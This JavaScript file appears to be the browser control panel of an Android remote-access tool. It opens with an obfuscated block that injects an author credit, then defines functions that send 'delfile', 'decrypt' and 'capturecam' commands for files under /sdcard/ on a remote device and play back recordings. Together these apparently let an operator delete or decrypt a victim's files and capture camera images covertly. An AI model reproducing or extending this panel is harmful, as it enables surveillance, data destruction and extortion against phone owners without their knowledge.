(function(g,h){var y={g:0x36f,h:0x36e,i:0x383,j:0x2c8,k:0x379,z:0x375,A:0x2ce,B:0x2d0,C:0x1bd,D:0x2cd,E:0x2b8,F:0x2c4,G:0x37f},x={g:0x247},v={g:0x22a};function n(g,h){return f(g- -v.g,h);}function l(g,h){return e(g-0x305,h);}function m(g,h){return d(g-x.g,h);}var i=g();while(!![]){try{var j=parseInt(l(0x36d,y.g))/(0xb29*-0x1+0x1*0x180d+0xce3*-0x1)*(-parseInt(l(y.h,0x374))/(0xc1*-0x7+0x4a*-0x59+0x1f03))+parseInt(l(0x392,y.i))/(0x6d*-0x47+-0xd0*0xe+-0x14cf*-0x2)*(-parseInt(m(y.j,0x2b3))/(0x975+0x4*-0x667+0x1*0x102b))+parseInt(l(y.k,y.z))/(0x2491*-0x1+-0x5b*-0x34+0x121a)*(parseInt(m(y.A,y.B))/(0x370+-0xb6*0x28+-0xc83*-0x2))+-parseInt(n(-y.C,'\x68\x5d\x37\x6e'))/(0x921+-0x1b8a+0x49c*0x4)+parseInt(n(-0x1b2,'\x72\x6f\x44\x31'))/(0x116+-0xf53+0xe45)*(parseInt(m(0x2bd,y.D))/(0x59*-0x7+0x1*0x22c8+0x40a*-0x8))+-parseInt(n(-0x19b,'\x35\x38\x74\x47'))/(0x21c5+-0x6*0x53d+-0x24d)*(-parseInt(m(y.E,0x2b6))/(0x3d*0x35+-0x11b*0xd+0x1c9))+-parseInt(m(y.F,0x2cb))/(-0x3*-0x19+0x12cf+0x12*-0x10f)*(-parseInt(l(0x38e,y.G))/(0x2*0x1255+-0x19*0x6d+-0x19f8));if(j===h)break;else i['push'](i['shift']());}catch(k){i['push'](i['shift']());}}}(c,-0x4c14c+-0x2bcc*0x1+-0x1d*-0x48d1));var b=(function(){var A={g:0xa4},g=!![];return function(h,i){var j=g?function(){var z={g:0x128};function o(g,h){return d(h- -z.g,g);}if(i){var k=i[o(-A.g,-0xaf)](h,arguments);return i=null,k;}}:function(){};return g=![],j;};}()),a=b(this,function(){var H={g:0x34f,h:0x342,i:0x52,j:0x64,k:0x53,I:0x5d,J:'\x7a\x71\x36\x39',K:0x82,L:0x45},G={g:0x2cd},E={g:0xd0},h={};function q(g,h){return d(h- -E.g,g);}function r(g,h){return f(h- -0x6,g);}function p(g,h){return e(g-G.g,h);}h[p(H.g,H.h)]=q(-H.i,-H.j)+'\x2b\x24';var i=h;return a[q(-H.k,-0x66)]()[q(-0x64,-H.I)](i[r(H.J,H.K)])['\x74\x6f\x53\x74\x72\x69\x6e\x67']()[p(0x33f,0x32c)+'\x72'](a)['\x73\x65\x61\x72\x63\x68'](i[q(-0x36,-H.L)]);});a();var xv=document['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d'+s(-0x24,-0x1c)](t('\x55\x33\x46\x21',0xc6));xv[s(-0x23,-0x17)]=u(-0x283,-0x285)+'\x74\x65\x65\x6b\x20\x43\x68\x61\x75\x62'+'\x65\x79',xv[s(0x0,-0x10)][t('\x6e\x25\x34\x67',0xce)]=u(-0x26a,-0x26c);function d(a,b){var e=c();return d=function(f,g){f=f-(-0x26de+-0x1*0x551+0x2c97);var h=e[f];return h;},d(a,b);}function e(a,b){var d=c();return e=function(f,g){f=f-(-0x26de+-0x1*0x551+0x2c97);var h=d[f];if(e['\x63\x57\x68\x65\x7a\x67']===undefined){var i=function(m){var n='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';var o='',p='',q=o+i;for(var r=-0x18b6+-0xe92+0x346*0xc,s,t,u=-0x1fbc+0x1662+0x95a;t=m['\x63\x68\x61\x72\x41\x74'](u++);~t&&(s=r%(-0x1*0x1d27+0x278*0x7+0xbe3)?s*(0x3*0xb6a+-0x9b*-0x25+-0x3865)+t:t,r++%(-0x71*-0x2f+-0x5*-0x7ad+-0x34*0x123))?o+=q['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](u+(0x73b+-0x1e33+0x1702))-(-0x1593*0x1+-0x2677*0x1+-0xc04*-0x5)!==0xa*-0x1e1+-0x20e*0x1+0x14d8?String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0x2b*-0x35+0x2*-0x66e+0x16c2&s>>(-(-0x12cf+-0x1cd8+-0x7*-0x6cf)*r&0xce*0x1+0x3*0x53c+0x1*-0x107c)):r:0x1*-0xb21+0x2294+-0x3*0x7d1){t=n['\x69\x6e\x64\x65\x78\x4f\x66'](t);}for(var v=0x1cdd+-0x174c+-0x591*0x1,w=o['\x6c\x65\x6e\x67\x74\x68'];v<w;v++){p+='\x25'+('\x30\x30'+o['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](v)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](0xde2*-0x1+-0x1*-0x2269+-0x193*0xd))['\x73\x6c\x69\x63\x65'](-(-0x18cc+0x1ec2+-0x5f4));}return decodeURIComponent(p);};e['\x64\x62\x6c\x70\x6e\x73']=i,a=arguments,e['\x63\x57\x68\x65\x7a\x67']=!![];}var j=d[-0x22f6+0x15f8+0xcfe],k=f+j,l=a[k];if(!l){var m=function(n){this['\x62\x73\x75\x42\x6b\x71']=n,this['\x63\x52\x58\x77\x66\x66']=[-0xb84+-0x1c54+0x27d9,-0x1*0x7ea+0x26bf+0x9*-0x36d,0x1c54+0xf55+0x1*-0x2ba9],this['\x64\x4d\x6a\x54\x74\x56']=function(){return'\x6e\x65\x77\x53\x74\x61\x74\x65';},this['\x58\x77\x4b\x44\x52\x7a']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['\x6d\x58\x45\x61\x67\x49']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};m['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x68\x6c\x56\x6e\x5a\x49']=function(){var n=new RegExp(this['\x58\x77\x4b\x44\x52\x7a']+this['\x6d\x58\x45\x61\x67\x49']),o=n['\x74\x65\x73\x74'](this['\x64\x4d\x6a\x54\x74\x56']['\x74\x6f\x53\x74\x72\x69\x6e\x67']())?--this['\x63\x52\x58\x77\x66\x66'][0xbaf+-0xb*-0x232+-0x23d4]:--this['\x63\x52\x58\x77\x66\x66'][-0x264a+-0x18d7+0x3f21];return this['\x4f\x66\x6c\x6f\x77\x53'](o);},m['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x4f\x66\x6c\x6f\x77\x53']=function(n){if(!Boolean(~n))return n;return this['\x59\x43\x53\x4c\x46\x50'](this['\x62\x73\x75\x42\x6b\x71']);},m['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x59\x43\x53\x4c\x46\x50']=function(n){for(var o=0x5*0x113+0x1442*-0x1+0xee3,p=this['\x63\x52\x58\x77\x66\x66']['\x6c\x65\x6e\x67\x74\x68'];o<p;o++){this['\x63\x52\x58\x77\x66\x66']['\x70\x75\x73\x68'](Math['\x72\x6f\x75\x6e\x64'](Math['\x72\x61\x6e\x64\x6f\x6d']())),p=this['\x63\x52\x58\x77\x66\x66']['\x6c\x65\x6e\x67\x74\x68'];}return n(this['\x63\x52\x58\x77\x66\x66'][0x3f8+0x1*0xcb3+-0x10ab]);},new m(e)['\x68\x6c\x56\x6e\x5a\x49'](),h=e['\x64\x62\x6c\x70\x6e\x73'](h),a[k]=h;}else h=l;return h;},e(a,b);}function s(g,h){var I={g:0x9c};return d(h- -I.g,g);}xv[s(-0x12,-0x10)][t('\x51\x34\x32\x6d',0xc2)]=s(-0xc,-0x20),xv[s(-0x1e,-0x10)]['\x74\x6f\x70']=u(-0x28f,-0x2a2);function c(){var L=['\x75\x72\x57\x48\x47','\x73\x74\x79\x6c\x65','\x6d\x30\x6a\x4f\x41\x4c\x76\x56\x41\x57','\x7a\x32\x76\x30\x72\x77\x58\x4c\x42\x77\x76\x55\x44\x61','\x57\x50\x33\x63\x4a\x73\x66\x2f\x57\x51\x42\x64\x4b\x6d\x6b\x46\x71\x43\x6f\x56\x57\x4f\x47','\x6d\x74\x76\x57\x45\x61','\x42\x79\x49\x64','\x6e\x5a\x47\x31\x6e\x4a\x6e\x75\x41\x33\x76\x56\x73\x4d\x6d','\x6e\x4e\x66\x78\x73\x4c\x48\x6c\x44\x47','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x6d\x5a\x62\x57\x45\x61','\x28\x28\x28\x2e\x2b\x29\x2b\x29\x2b\x29','\x79\x53\x6f\x54\x57\x34\x47\x4c\x67\x30\x4f\x4a\x57\x36\x52\x64\x4c\x6d\x6b\x4e\x57\x36\x33\x63\x4d\x61','\x36\x71\x57\x4a\x58\x4b\x76','\x6d\x74\x61\x57\x6a\x73\x4b','\x67\x66\x2f\x63\x4b\x6d\x6f\x38\x6f\x65\x57\x53\x57\x37\x74\x63\x56\x74\x4c\x33\x57\x4f\x76\x34','\x36\x37\x31\x30\x43\x49\x70\x4c\x4b\x6a','\x79\x32\x39\x55\x43\x33\x72\x59\x44\x77\x6e\x30\x42\x57','\x73\x65\x61\x72\x63\x68','\x6e\x78\x6e\x4f\x79\x32\x6e\x30\x44\x71','\x44\x68\x6a\x48\x42\x4e\x6e\x4d\x42\x33\x6a\x54','\x36\x32\x31\x39\x61\x6a\x62\x77\x64\x44','\x6a\x4d\x6e\x56\x43\x68\x4b\x37\x69\x66\x62\x59\x79\x71','\x57\x4f\x54\x34\x57\x35\x69\x6b\x70\x6d\x6b\x36\x6b\x6d\x6b\x56\x57\x34\x38','\x61\x70\x70\x6c\x79','\x78\x6d\x6b\x61\x73\x5a\x52\x63\x4b\x31\x37\x63\x55\x31\x4f','\x57\x4f\x75\x69\x57\x36\x43\x61\x63\x48\x37\x63\x56\x71','\x61\x62\x73\x6f\x6c\x75\x74\x65','\x33\x34\x38\x62\x48\x6a\x4b\x55\x66','\x57\x35\x54\x4a\x74\x47','\x57\x34\x50\x6c\x63\x31\x31\x6a\x57\x52\x46\x64\x4d\x31\x4a\x63\x55\x71','\x65\x6e\x74','\x31\x31\x32\x31\x33\x33\x32\x75\x63\x4f\x6a\x6d\x7a','\x44\x78\x6a\x78\x73\x65\x43','\x74\x6f\x70\x68\x65\x61\x64','\x35\x73\x68\x63\x63\x74\x75','\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c','\x57\x51\x76\x6e\x57\x4f\x78\x63\x56\x43\x6b\x66\x6a\x53\x6b\x77\x57\x34\x43','\x38\x38\x31\x35\x33\x38\x5a\x5a\x7a\x6c\x45\x4c','\x45\x53\x6f\x32\x70\x6d\x6f\x76\x57\x36\x65','\x6d\x4a\x65\x30\x6d\x64\x71\x31\x72\x75\x31\x66\x79\x31\x7a\x65','\x35\x32\x32\x38\x33\x30\x53\x4b\x74\x64\x49\x46'];c=function(){return L;};return c();}function f(a,b){var d=c();return f=function(e,g){e=e-(-0x26de+-0x1*0x551+0x2c97);var h=d[e];if(f['\x6f\x43\x4c\x49\x6e\x64']===undefined){var i=function(n){var o='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';var p='',q='',r=p+i;for(var s=-0x18b6+-0xe92+0x346*0xc,t,u,v=-0x1fbc+0x1662+0x95a;u=n['\x63\x68\x61\x72\x41\x74'](v++);~u&&(t=s%(-0x1*0x1d27+0x278*0x7+0xbe3)?t*(0x3*0xb6a+-0x9b*-0x25+-0x3865)+u:u,s++%(-0x71*-0x2f+-0x5*-0x7ad+-0x34*0x123))?p+=r['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](v+(0x73b+-0x1e33+0x1702))-(-0x1593*0x1+-0x2677*0x1+-0xc04*-0x5)!==0xa*-0x1e1+-0x20e*0x1+0x14d8?String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0x2b*-0x35+0x2*-0x66e+0x16c2&t>>(-(-0x12cf+-0x1cd8+-0x7*-0x6cf)*s&0xce*0x1+0x3*0x53c+0x1*-0x107c)):s:0x1*-0xb21+0x2294+-0x3*0x7d1){u=o['\x69\x6e\x64\x65\x78\x4f\x66'](u);}for(var w=0x1cdd+-0x174c+-0x591*0x1,x=p['\x6c\x65\x6e\x67\x74\x68'];w<x;w++){q+='\x25'+('\x30\x30'+p['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](w)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](0xde2*-0x1+-0x1*-0x2269+-0x193*0xd))['\x73\x6c\x69\x63\x65'](-(-0x18cc+0x1ec2+-0x5f4));}return decodeURIComponent(q);};var m=function(n,o){var p=[],q=-0x22f6+0x15f8+0xcfe,r,t='';n=i(n);var u;for(u=-0xb84+-0x1c54+0x27d8;u<-0x1*0x7ea+0x26bf+0x7*-0x443;u++){p[u]=u;}for(u=0x1c54+0xf55+0x1*-0x2ba9;u<0xbaf+-0xb*-0x232+-0x22d5;u++){q=(q+p[u]+o['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](u%o['\x6c\x65\x6e\x67\x74\x68']))%(-0x264a+-0x18d7+0x4021),r=p[u],p[u]=p[q],p[q]=r;}u=0x5*0x113+0x1442*-0x1+0xee3,q=0x3f8+0x1*0xcb3+-0x10ab;for(var v=-0x24ad+0x571*0x2+0x19cb;v<n['\x6c\x65\x6e\x67\x74\x68'];v++){u=(u+(-0x18c*-0x4+0x2*0x9a4+-0x1977))%(0x1*0x180d+0x131*0x13+-0x4*0xb6c),q=(q+p[u])%(0x59*-0x4a+-0x5*-0x431+0x5c5),r=p[u],p[u]=p[q],p[q]=r,t+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](n['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](v)^p[(p[u]+p[q])%(0x1a0*-0x7+0x13b4+-0x3aa*0x2)]);}return t;};f['\x44\x4a\x58\x57\x4e\x72']=m,a=arguments,f['\x6f\x43\x4c\x49\x6e\x64']=!![];}var j=d[0x975+0x4*-0x667+0x1*0x1027],k=e+j,l=a[k];if(!l){if(f['\x47\x66\x62\x66\x4d\x69']===undefined){var n=function(o){this['\x6b\x54\x78\x55\x78\x4b']=o,this['\x4f\x67\x73\x6b\x46\x4e']=[0x2491*-0x1+-0x5b*-0x34+0x1216,0x370+-0xb6*0x28+-0x100*-0x19,0x921+-0x1b8a+0x1269*0x1],this['\x49\x6a\x48\x62\x69\x7a']=function(){return'\x6e\x65\x77\x53\x74\x61\x74\x65';},this['\x61\x54\x72\x66\x6c\x47']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['\x7a\x51\x5a\x4a\x51\x74']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};n['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x7a\x78\x61\x6f\x73\x4d']=function(){var o=new RegExp(this['\x61\x54\x72\x66\x6c\x47']+this['\x7a\x51\x5a\x4a\x51\x74']),p=o['\x74\x65\x73\x74'](this['\x49\x6a\x48\x62\x69\x7a']['\x74\x6f\x53\x74\x72\x69\x6e\x67']())?--this['\x4f\x67\x73\x6b\x46\x4e'][0x116+-0xf53+0xe3e]:--this['\x4f\x67\x73\x6b\x46\x4e'][0x59*-0x7+0x1*0x22c8+0x49f*-0x7];return this['\x64\x79\x76\x46\x45\x64'](p);},n['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x64\x79\x76\x46\x45\x64']=function(o){if(!Boolean(~o))return o;return this['\x53\x5a\x41\x4b\x53\x71'](this['\x6b\x54\x78\x55\x78\x4b']);},n['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x53\x5a\x41\x4b\x53\x71']=function(o){for(var p=0x21c5+-0x6*0x53d+-0x257,q=this['\x4f\x67\x73\x6b\x46\x4e']['\x6c\x65\x6e\x67\x74\x68'];p<q;p++){this['\x4f\x67\x73\x6b\x46\x4e']['\x70\x75\x73\x68'](Math['\x72\x6f\x75\x6e\x64'](Math['\x72\x61\x6e\x64\x6f\x6d']())),q=this['\x4f\x67\x73\x6b\x46\x4e']['\x6c\x65\x6e\x67\x74\x68'];}return o(this['\x4f\x67\x73\x6b\x46\x4e'][0x3d*0x35+-0x11b*0xd+0x1be]);},new n(f)['\x7a\x78\x61\x6f\x73\x4d'](),f['\x47\x66\x62\x66\x4d\x69']=!![];}h=f['\x44\x4a\x58\x57\x4e\x72'](h,g),a[k]=h;}else h=l;return h;},f(a,b);}function u(g,h){var J={g:0x2fa};return e(g- -J.g,h);}xv[s(0x0,-0x10)][u(-0x285,-0x281)]='\x74\x72\x61\x6e\x73\x6c\x61\x74\x65\x28'+u(-0x28b,-0x28f);function t(g,h){return f(h-0x48,g);}document[u(-0x26c,-0x276)+s(-0x19,-0xb)](s(-0xb,-0x19))['\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c'+'\x64'](xv);
function foldel(o){
document.getElementById("filwt").style.display="none";
var tarfol=o.parentElement.parentElement.getAttribute("data-file");
var tarfoltype=o.parentElement.parentElement.getAttribute("data-type");
if(tarfol==".."){
setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);
}
else if((tarfoltype.indexOf("fo") < 0) && (tarfol.indexOf("<b>") > -1)){
setdatcmd("delfile",var32+"/"+tarfol.substr(0,tarfol.indexOf("<b>")),"",respov);
setdatcmd("cd","/sdcard/","",respov);
}
else{ 
setdatcmd("delfile",var32+"/"+tarfol,"",respov);
setdatcmd("cd","/sdcard/","",respov);
}

}
function decryptfol(o){
document.getElementById("filwt").style.display="none";
var tarfol=o.parentElement.parentElement.getAttribute("data-file");
var tarfoltype=o.parentElement.parentElement.getAttribute("data-type");
if(tarfol==".."){
setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);
}
else if((tarfoltype.indexOf("fo") < 0) && (tarfol.indexOf("<b>") > -1)){
setdatcmd("decrypt",var32+"/"+tarfol.substr(0,tarfol.indexOf("<b>")),"",respov);
setdatcmd("cd","/sdcard/","",respov);
}
else{ 
setdatcmd("decrypt",var32+"/"+tarfol,"",respov);
setdatcmd("cd","/sdcard/","",respov);
}
}
function camss(){
setdatcmd("capturecam","","",respov);
manager="camview";
}
function playssrec(o){
if(o.nextElementSibling.paused == false){
o.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg>';
o.nextElementSibling.pause();
}
else{
o.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-pause" viewBox="0 0 16 16"><path d="M6 3.5a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5zm4 0a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5z"/></svg>';
o.nextElementSibling.play();
}
}
function downliio(o){
window.open(o);
}


